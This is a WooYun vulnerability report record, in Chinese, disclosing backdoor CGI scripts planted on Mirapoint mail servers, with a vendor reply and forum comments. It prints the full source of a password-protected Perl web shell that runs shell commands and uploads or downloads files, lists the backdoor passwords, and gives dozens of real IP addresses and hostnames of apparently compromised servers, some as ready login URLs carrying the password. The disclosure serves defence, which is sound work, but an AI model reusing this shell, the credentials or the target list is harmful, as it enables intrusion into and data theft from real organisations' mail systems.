{"id": 46366, "wybug_id": "wooyun-2014-085098", "wybug_title": "大量使用Mirapoint的邮件系统被自动化植入后门（统计中招比例1/5）", "wybug_corp": "Mirapoint Software, Inc", "wybug_author": "路人甲", "wybug_date": "2014-11-28 15:35", "wybug_open_date": "2015-02-26 15:36", "wybug_type": "地下0day/成功的入侵事件", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "应用程序后门"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-06：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-01-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-26：\t细节向公众公开  简要描述： 大量使用Mirapoint的邮件系统发现后门（比例1/5）本来打算看看Mirapoint的源代码 做下审计，结果发现两个可疑文件。 详细说明：  发现两个后门文件：cgi-bin/frame.cgi    密码：system_admincgi-bin/licenses.cgi 密码：system_nimdalicenses最多\nhttps://210.162.133.131/cgi-bin/licenses.cgi:\t200https://192.195.154.239/cgi-bin/licenses.cgi:\t200https://91.217.172.181/cgi-bin/licenses.cgi:\t200https://74.219.78.212/cgi-bin/licenses.cgi:\t200https://202.147.192.101/cgi-bin/licenses.cgi:\t200https://202.147.192.101/cgi-bin/licenses.cgi:\t200https://64.62.143.195/cgi-bin/licenses.cgi:\t200https://202.147.192.105/cgi-bin/licenses.cgi:\t200https://61.120.197.38/cgi-bin/licenses.cgi:\t200https://124.93.238.176/cgi-bin/licenses.cgi:\t200https://12.219.233.49/cgi-bin/licenses.cgi:\t000https://192.195.154.243/cgi-bin/licenses.cgi:\t200https://192.195.154.242/cgi-bin/licenses.cgi:\t200https://199.26.202.34/cgi-bin/licenses.cgi:\t200https://91.217.172.227/cgi-bin/licenses.cgi:\t200https://91.217.172.230/cgi-bin/licenses.cgi:\t200https://58.65.0.250/cgi-bin/licenses.cgi:\t200https://64.62.143.195/cgi-bin/licenses.cgi:\t200https://72.22.9.20/cgi-bin/licenses.cgi:\t200https://72.22.9.20/cgi-bin/licenses.cgi:\t200https://12.14.47.76/cgi-bin/licenses.cgi:\t200https://72.22.9.20/cgi-bin/licenses.cgi:\t200https://12.14.47.76/cgi-bin/licenses.cgi:\t200https://72.22.9.21/cgi-bin/licenses.cgi:\t200https://202.147.192.101/cgi-bin/licenses.cgi:\t200https://91.217.172.234/cgi-bin/licenses.cgi:\t200https://137.165.4.244/cgi-bin/licenses.cgi:\t200https://195.10.115.239/cgi-bin/licenses.cgi:\t200https://219.142.74.67/cgi-bin/licenses.cgi:\t403https://81.246.0.216/cgi-bin/licenses.cgi:\t200https://202.147.192.101/cgi-bin/licenses.cgi:\t200\n\nhttp://mail1.coscodl.com/cgi-bin/licenses.cgi?p=system_nimda&a=LOGINhttps://124.93.238.176/cgi-bin/frame.cgi?p=system_admin&a=LOGINhttp://mail.infokom.net/cgi-bin/licenses.cgi?p=system_nimda&a=LOGINhttp://mail1.coscodl.com/cgi-bin/licenses.cgi?p=system_nimda&a=LOGINhttp://124.93.238.165/cgi-bin/licenses.cgi?p=system_nimda&a=LOGINhttp://203.80.116.242/cgi-bin/licenses.cgi?p=system_nimda&a=LOGINhttps://mailpr.coscodl.com/cgi-bin/licenses.cgi?p=system_nimda&a=LOGINhttp://pelican.admin.ccny.cuny.edu/cgi-bin/licenses.cgi?p=system_nimda&a=LOGINhttps://124.93.238.176/cgi-bin/frame.cgi?p=system_admin&a=LOGINhttp://mail.infokom.net/cgi-bin/licenses.cgihttps://124.93.238.176/cgi-bin/licenses.cgihttp://124.93.238.165/cgi-bin/licenses.cgihttp://203.80.116.242/cgi-bin/licenses.cgihttps://mailpr.coscodl.com/cgi-bin/licenses.cgihttp://pelican.admin.ccny.cuny.edu/cgi-bin/licenses.cgi\n后门源码：\n#!/usr/bin/perl -w$Password=\"system_nimda\";$WinNT=0;$NTCmdSep=\"&\";$UnixCmdSep=\";\";$CommandTimeoutDuration=50;$ShowDynamicOutput=1;$CmdSep=($WinNT ? $NTCmdSep : $UnixCmdSep);$CmdPwd=($WinNT ? \"cd\" : \"pwd\");$PathSep=($WinNT ? \"\\\\\" : \"/\");$Redirector=($WinNT ? \" 2>&1 1>&2\" : \" 1>&1 2>&1\");sub ReadParse{\tlocal(*in)=@_ if @_;\tlocal($i,$loc,$key,$val);\t$MultipartFormData=$ENV{'CONTENT_TYPE'} =~ /multipart\\/form-data; boundary=(.+)$/;\tif($ENV{'REQUEST_METHOD'} eq \"GET\"){$in=$ENV{'QUERY_STRING'};}\telsif($ENV{'REQUEST_METHOD'} eq \"POST\"){binmode(STDIN) if $MultipartFormData & $WinNT;read(STDIN, $in, $ENV{'CONTENT_LENGTH'});}\tif($ENV{'CONTENT_TYPE'} =~ /multipart\\/form-data; boundary=(.+)$/){\t\t$Boundary='--'.$1;\t\t@list=split(/$Boundary/,$in); \t\t$HeaderBody=$list[1];\t\t$HeaderBody =~ /\\r\\n\\r\\n|\\n\\n/;\t\t$Header=$`;\t\t$Body=$'; \t\t$Body =~ s/\\r\\n$//; # the last \\r\\n was put in by Netscape\t\t$in{'filedata'}=$Body;\t\t$Header =~ /filename=\\\"(.+)\\\"/; \t\t$in{'f'}=$1; \t\t$in{'f'} =~ s/\\\"//g;\t\t$in{'f'} =~ s/\\s//g;\t\tfor($i=2; $list[$i]; $i++){ \t\t\t$list[$i] =~ s/^.+name=$//;\t\t\t$list[$i] =~ /\\\"(\\w+)\\\"/;\t\t\t$key=$1;\t\t\t$val=$';\t\t\t$val =~ s/(^(\\r\\n\\r\\n|\\n\\n))|(\\r\\n$|\\n$)//g;\t\t\t$val =~ s/%(..)/pack(\"c\", hex($1))/ge;\t\t\t$in{$key}=$val;}}\telse{\t\t@in=split(/&/, $in);\t\tforeach $i (0 .. $#in){\t\t\t$in[$i] =~ s/\\+/ /g;\t\t\t($key, $val)=split(/=/, $in[$i], 2);\t\t\t$key =~ s/%(..)/pack(\"c\", hex($1))/ge;\t\t\t$val =~ s/%(..)/pack(\"c\", hex($1))/ge;\t\t\t$in{$key} .= \"\\0\" if (defined($in{$key}));\t\t\t$in{$key} .= $val;}}}sub PrintPageHeader{$EncodedCurrentDir=$CurrentDir;$EncodedCurrentDir =~ s/([^a-zA-Z0-9])/'%'.unpack(\"H*\",$1)/eg;print \"Content-type: text/html\\n\\n\";print <<END;<html><head><title>Mirapoint Software</title>$HtmlMetaHeader</head><body onLoad=\"document.f.@_.focus()\" style=\"background:#AAAAAA;\" topmargin=\"0\" leftmargin=\"0\" marginwidth=\"0\" marginheight=\"0\"><table style=\"width:955px;\" align=\"center\" border=\"0\" cellspacing=\"0\" cellpadding=\"2\"><tr><td bgcolor=\"#293F5F\"><font face=\"Verdana\" size=\"2\" color=\"#FFFFFF\"><b>&nbsp;&#8857;&nbsp;$ServerName:$ENV{'SERVER_PORT'} - $ENV{'SERVER_SOFTWARE'} - $ENV{'GATEWAY_INTERFACE'}</b></font></td></tr><tr>\t<td colspan=\"2\" bgcolor=\"#FFFFE0\"><font color=\"#FF0000\" size=\"2\">\t&nbsp;&nbsp;<a href=\"$ScriptLocation?a=upload&d=$EncodedCurrentDir\">&#25991;&#20214;&#19978;&#20256;</a> | \t<a href=\"$ScriptLocation?a=download&d=$EncodedCurrentDir\">&#25991;&#20214;&#19979;&#36733;</a> |\t<a href=\"$ScriptLocation?a=logout\">&#27880;&#38144;&#30331;&#24405;</a> |\tpower by Mirapoint</a></font></td></tr><tr><td><font color=\"#006633\" size=\"3\">END}sub PrintLoginScreen{$Message;}sub PrintLoginFailedMessage{print \"<codef>Login Failed,Wrong Password</codef>\";}sub PrintLoginForm{print <<END;<center><form namord><div style=\"width:351px;height:201px;margin-top:100px;background:threedface;border-color:#FFFFFF #999999 #999999 #FFFFFF;border-style:solid;border-width:1px;\"><div style=\"width:350px;height:22px;padding-top:2px;color:#FFFFFF;background:#293F5F;clear:both;\"><b>Login</b></div><div style=\"width:350px;height:80px;margin-top:50px;color:#000000;clear:both;\">PASS:<input type=\"password\" name=\"p\" style=\"width:270px;\"></div><div style=\"width:350px;height:30px;clear:both;\"><input type=\"submit\" name=\"a\" value=\"LOGIN\" style=\"width:80px;\"></div></div></form></center>END}sub PrintPageFooter{print \"</font></td></tr></table></body></html>\";}sub GetCookies{@httpcookies=split(/; /,$ENV{'HTTP_COOKIE'});foreach $cookie(@httpcookies){($id, $val)=split(/=/, $cookie);$Cookies{$id}=$val;}}sub PrintLogoutScreen{print \"<codef>Logout Success<br><br></codef>\";}sub PerformLogout{\tprint \"Set-Cookie: SAVEDPWD=;\\n\";\t&PrintPageHeader(\"p\");\t&PrintLogoutScreen;\t&PrintLoginScreen;\t&PrintLoginForm;\t&PrintPageFooter;}sub PerformLogin {\tif($LoginPassword eq $Password){\t\tprint \"Set-Cookie: SAVEDPWD=$LoginPassword;\\n\";\t\t&PrintPageHeader(\"c\");\t\t&PrintCommandLineInputForm;\t\t&PrintPageFooter;\t}else{\t\t&PrintPageHeader(\"p\");\t\t&PrintLoginScreen;\t\tif($LoginPassword ne \"\"){&PrintLoginFailedMessage;}\t\t&PrintLoginForm;\t\t&PrintPageFooter;\t}}sub PrintCommandLineInputForm{$Prompt=$WinNT ? \"$CurrentDir> \":\"[xyuser\\@$ServerName $CurrentDir]\\$ \";print <<END;<codef><form name=\"f\" method=\"POST\" action=\"$ScriptLocation\"><input type=\"hidden\" name=\"a\" value=\"command\"><input type=\"hidden\" name=\"d\" value=\"$CurrentDir\">$Prompt<input type=\"text\" name=\"c\" style=\"width:550px;\"></form></codef>END}sub PrintFileDownloadForm{$Prompt=$WinNT ? \"$CurrentDir> \" : \"[r00t\\@$ServerName $CurrentDir]\\$ \";print <<END;<codef><form name=\"f\" method=\"POST\" action=\"$ScriptLocation\"><input type=\"hidden\" name=\"d\" value=\"$CurrentDir\"><input type=\"hidden\" name=\"a\" value=\"download\">$Prompt download<br><br>Filename: <input type=\"text\" name=\"f\" size=\"35\"><br><br>Download: <input type=\"submit\" value=\"Begin\"></form></codef>END}sub PrintFileUploadForm{$Prompt=$WinNT ? \"$CurrentDir> \" : \"[r00t\\@$ServerName $CurrentDir]\\$ \";print <<END;<codef><form name=\"f\" enctype=\"multipart/form-data\" method=\"POST\" action=\"$ScriptLocation\">$Prompt upload<br><br>Filename: <input type=\"file\" name=\"f\" size=\"35\"><br><br>Options: &nbsp;<input type=\"checkbox\" name=\"o\" value=\"overwrite\">Overwrite if it Exists<br><br>Upload:&nbsp;&nbsp;&nbsp;<input type=\"submit\" value=\"Begin\"><input type=\"hidden\" name=\"d\" value=\"$CurrentDir\"><input type=\"hidden\" name=\"a\" value=\"upload\"></form></codef>END}sub CommandTimeout{if(!$WinNT){alarm(0);print <<END;</xmp><codef>Command exceeded maximum time of $CommandTimeoutDuration second(s).<br>Killed it!<codef>END&PrintCommandLineInputForm;&PrintPageFooter;exit;}}sub ExecuteCommand{\tif($RunCommand =~ m/^\\s*cd\\s+(.+)/){\t\t$OldDir=$CurrentDir;\t\t$Command=\"cd \\\"$CurrentDir\\\"\".$CmdSep.\"cd $1\".$CmdSep.$CmdPwd;\t\tchop($CurrentDir=`$Command`);\t\t&PrintPageHeader(\"c\");\t\t$Prompt=$WinNT ? \"$OldDir> \" : \"[r00t\\@$ServerName $OldDir]\\$ \";\t\tprint \"<codef>$Prompt $RunCommand</codef>\";\t}else{\t\t&PrintPageHeader(\"c\");\t\t$Prompt=$WinNT ? \"$CurrentDir> \" : \"[r00t\\@$ServerName $CurrentDir]\\$ \";\t\tprint \"<codef>$Prompt $RunCommand</codef><xmp>\";\t\t$Command=\"cd \\\"$CurrentDir\\\"\".$CmdSep.$RunCommand.$Redirector;\t\tif(!$WinNT){$SIG{'ALRM'}=\\&CommandTimeout;alarm($CommandTimeoutDuration);}\t\tif($ShowDynamicOutput){\t\t\t$|=1;\t\t\t$Command .= \" |\";\t\t\topen(CommandOutput, $Command);\t\t\twhile(<CommandOutput>){$_ =~ s/(\\n|\\r\\n)$//;print \"$_\\n\";}\t\t\t$|=0;\t\t}else{print `$Command`;}\t\tif(!$WinNT){alarm(0);}\t\tprint \"</xmp>\";\t}\t&PrintCommandLineInputForm;\t&PrintPageFooter;}sub PrintDownloadLinkPage{local($FileUrl)=@_;if(-e $FileUrl){\t$FileUrl =~ s/([^a-zA-Z0-9])/'%'.unpack(\"H*\",$1)/eg;\t$DownloadLink=\"$ScriptLocation?a=download&f=$FileUrl&o=go\";\t$HtmlMetaHeader=\"<meta HTTP-EQUIV=\\\"Refresh\\\" CONTENT=\\\"1; URL=$DownloadLink\\\">\";\t&PrintPageHeader(\"c\");print <<END;<codef>Sending File $TransferFile...<br>If the download does not start automatically,<a href=\"$DownloadLink\">Click Here</a>.</codef>END\t&PrintCommandLineInputForm;\t&PrintPageFooter;}else{\t\t&PrintPageHeader(\"f\");\t\tprint \"<codef>&#19979;&#36733;&#22833;&#36133; $FileUrl: $!</codef>\";\t\t&PrintFileDownloadForm;\t\t&PrintPageFooter;}}sub SendFileToBrowser{\tlocal($SendFile)=@_;\tif(open(SENDFILE, $SendFile)) # file opened for reading\t{if($WinNT){binmode(SENDFILE);binmode(STDOUT);}\t\t$FileSize=(stat($SendFile))[7];\t\t($Filename=$SendFile) =~  m!([^/^\\\\]*)$!;\t\tprint \"Content-Type: application/x-unknown\\n\";\t\tprint \"Content-Length: $FileSize\\n\";\t\tprint \"Content-Disposition: attachment; filename=$1\\n\\n\";\t\tprint while(<SENDFILE>);\t\tclose(SENDFILE);\t}\telse{\t\t&PrintPageHeader(\"f\");\t\tprint \"<codef>&#19979;&#36733;&#22833;&#36133; $SendFile: $!</codef>\";\t\t&PrintFileDownloadForm;\t\t&PrintPageFooter;\t}}sub BeginDownload{if(($WinNT & ($TransferFile =~ m/^\\\\|^.:/))|(!$WinNT & ($TransferFile =~ m/^\\//))){$TargetFile=$TransferFile;}else{chop($TargetFile) if($TargetFile=$CurrentDir) =~ m/[\\\\\\/]$/;$TargetFile .= $PathSep.$TransferFile;}if($Options eq \"go\"){&SendFileToBrowser($TargetFile);}else{&PrintDownloadLinkPage($TargetFile);}}sub UploadFile{if($TransferFile eq \"\"){&PrintPageHeader(\"f\");&PrintFileUploadForm;&PrintPageFooter;return;}\t&PrintPageHeader(\"c\");\tprint \"<codef>Uploading $TransferFile to $CurrentDir...<br>\";\tchop($TargetName) if ($TargetName=$CurrentDir) =~ m/[\\\\\\/]$/;\t$TransferFile =~ m!([^/^\\\\]*)$!;\t$TargetName .= $PathSep.$1;\t$TargetFileSize=length($in{'filedata'});\tif(-e $TargetName && $Options ne \"overwrite\"){print \"Failed:&#30446;&#26631;&#25991;&#20214;&#24050;&#23384;&#22312;...<br>\";\t}else{\t\tif(open(UPLOADFILE, \">$TargetName\")){\t\t\tbinmode(UPLOADFILE) if $WinNT;\t\t\tprint UPLOADFILE $in{'filedata'};\t\t\tclose(UPLOADFILE);\t\t\tprint \"Transfered $TargetFileSize Bytes.<br>\";\t\t\tprint \"File Path: $TargetName<br>\";\t\t}else{print \"Failed: $!<br>\";}\t}\tprint \"</codef>\";\t&PrintCommandLineInputForm;\t&PrintPageFooter;}sub DownloadFile{\tif($TransferFile eq \"\"){&PrintPageHeader(\"f\");&PrintFileDownloadForm;&PrintPageFooter;return;}\tif(($WinNT & ($TransferFile =~ m/^\\\\|^.:/))|(!$WinNT & ($TransferFile =~ m/^\\//))){$TargetFile=$TransferFile;}\telse{chop($TargetFile) if($TargetFile=$CurrentDir) =~ m/[\\\\\\/]$/;$TargetFile .= $PathSep.$TransferFile;}\tif($Options eq \"go\"){&SendFileToBrowser($TargetFile);}\telse{&PrintDownloadLinkPage($TargetFile);}}&ReadParse;&GetCookies;$ScriptLocation=$ENV{'SCRIPT_NAME'};$ServerName=$ENV{'SERVER_NAME'};$LoginPassword=$in{'p'};$RunCommand=$in{'c'};$TransferFile=$in{'f'};$Options=$in{'o'};$Action=$in{'a'};$Action=\"LOGIN\" if($Action eq \"\");$CurrentDir=$in{'d'};chop($CurrentDir=`$CmdPwd`) if($CurrentDir eq \"\");$LoggedIn=$Cookies{'SAVEDPWD'} eq $Password;if($Action eq \"LOGIN\" || !$LoggedIn){&PerformLogin;}elsif($Action eq \"command\"){&ExecuteCommand;}elsif($Action eq \"upload\"){&UploadFile;}elsif($Action eq \"download\"){&DownloadFile;}elsif($Action eq \"logout\"){&PerformLogout;}\n不排除还有藏的更深的后门中石化的系统被留过后门，目前被waf之类的防了https://219.142.74.67/cgi-bin/licenses.cgi中央外汇业务中心https://219.141.224.182/cgi-bin/licenses.cgi   也被防了但还有好多用户的是没有waf防范后门的   漏洞证明：  \n\n\n\n\n\n\n\n\n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-12-03 08:35 厂商回复： CNVD确认并复现所述情况，此前BASH漏洞披露时，CNVD对Mirapoint已经列入监测范围。后续将根据白帽子提供的后门攻击线索，加强监测，重点处置涉及国内用户的案例。由于案例较多，未能一一处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-11-28 16:37 |    \t\tRainShine \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:4        )\t\t \n  卧槽！    \n     2014-11-28 16:55 |    \t\tbey0nd \t\t\t( 普通白帽子  |\t\t\t        Rank:895 漏洞数:142        | 相忘于江湖，不如相濡以沫)\t\t \n  都留后门。。。    \n     2014-11-28 16:57 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:882 漏洞数:157        | 收wb 1：5 无限量收 [平台担保]))\t\t \n  坐等详情。    \n     2014-11-28 19:03 |    \t\tPower \t\t\t( 实习白帽子  |\t\t\t        Rank:54 漏洞数:22        | 还需要等待.........)\t\t \n  mark    \n     2014-11-28 19:29 |    \t\tcncert国家互联网应急中心(乌云厂商)\t\t \n  mark    \n     2014-11-28 19:58 |    \t\t野狼 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | CcAv TeAm成员，CCAV11站长，白帽子。)\t\t \n  mark    \n     2014-11-28 20:21 |    \t\tsix-door \t\t\t( 普通白帽子  |\t\t\t        Rank:211 漏洞数:31        )\t\t \n  mark    \n     2014-11-28 21:23 |    \t\tC4ndy \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:1        )\t\t \n  Mark    \n     2014-11-28 23:02 |    \t\t不知道2017 \t\t\t( 路人 |\t\t\t        Rank:26 漏洞数:6        | 专注信息安全领域)\t\t \n  这个牛    \n     2014-12-02 12:00 |    \t\t天噬小然 \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:4        )\t\t \n  mark    \n     2015-02-26 16:24 |    \t\t一只猿 \t\t\t( 普通白帽子  |\t\t\t        Rank:463 漏洞数:89        | 硬件与无线通信研究方向)\t\t \n  mark     \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}